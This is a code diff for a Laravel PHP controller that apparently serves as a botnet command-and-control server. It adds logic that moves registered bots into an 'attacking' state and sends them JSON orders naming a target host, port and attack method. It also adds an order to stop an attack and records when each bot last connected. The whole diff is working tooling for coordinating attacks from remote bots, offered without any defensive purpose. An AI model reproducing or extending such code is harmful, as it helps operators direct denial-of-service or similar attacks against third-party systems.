@@ -8,6 +8,8 @@ use Illuminate\Http\Request;
 
 use App\Repositories\BotRepository;
 
+use Carbon\Carbon;
+
 class ApiBotsController extends Controller
 {
 
@@ -42,6 +44,16 @@ class ApiBotsController extends Controller
 
       if ($bot->needInformation()) {
         return $this->askInformationReponse();
+
+      } elseif ($bot->needAttackStart()) {
+        $this->botRepository->update(['state' => 'attacking'], $bot->id);
+        return $this->startAttackResonse($bot);
+
+      } elseif ($bot->needAttackEnd()) {
+        $attackId = $bot->attack()->first()->id;
+        $this->botRepository->update(['state' => 'connected', 'attack_id' => null], $bot->id);
+        return $this->stopAttackResonse($attackId);
+
       } else {
         return $this->successResponse();
       }
@@ -53,6 +65,11 @@ class ApiBotsController extends Controller
     }
   }
 
+  /**
+  * Reponse to send when information about bot is required
+  *
+  * @return \Illuminate\Http\Response
+  */
   protected function askInformationReponse()
   {
     return response()->json([
@@ -60,23 +77,71 @@ class ApiBotsController extends Controller
     ]);
   }
 
-  protected function badRequestResponse()
-  {
-    return response()->json([], 400);
-  }
-
+  /**
+  * Reponse to send when nothing else than ok is required
+  *
+  * @return \Illuminate\Http\Response
+  */
   protected function successResponse()
   {
     return response()->json([]);
   }
 
+  /**
+  * Reponse to send when bot needs to start an attack
+  *
+  * @param Bot $bot
+  * @return \Illuminate\Http\Response
+  */
+  protected function startAttackResonse(Bot $bot)
+  {
+    return response()->json([
+      'opcode' => 272,
+      'payload' => [
+        'id' => $bot->attack()->first()->id,
+        'target' => $bot->attack()->first()->target,
+        'port' => $bot->attack()->first()->port,
+        'method' => $bot->attack()->first()->method()->first()->name
+      ],
+    ]);
+  }
+
+  /**
+  * Reponse to send when bot needs to end an attack
+  *
+  * @param mixed $attackId
+  * @return \Illuminate\Http\Response
+  */
+  protected function stopAttackResonse($attackId)
+  {
+    return response()->json([
+      'opcode' => 288,
+      'payload' => [
+        'id' => $attackId,
+      ],
+    ]);
+  }
+
+  /**
+  * Reponse to send when inconsistent request is sent
+  *
+  * @return \Illuminate\Http\Response
+  */
+  protected function badRequestResponse()
+  {
+    return response()->json([], 400);
+  }
+
+  /**
+  * Manage bot heartbeat connection to have right state
+  */
   private function heartBeat(Array $data, Bot $bot = null)
   {
     if ($bot) {
       if ($data['opcode'] == 16) {
-        $this->botRepository->update(['state' => 'connected'], $bot->id);
+        $this->botRepository->update(['state' => 'connected', 'attack_id' => null, 'connected_at' => Carbon::now()], $bot->id);
       } else {
-        $bot->touch();
+        $this->botRepository->update(['connected_at' => Carbon::now()], $bot->id);
       }
 
     } else {
@@ -86,6 +151,9 @@ class ApiBotsController extends Controller
     return $bot;
   }
 
+  /**
+  * Store information sent by a bot
+  */
   private function storeInformation(Array $data, Bot $bot)
   {
     $bot = $this->botRepository->update([
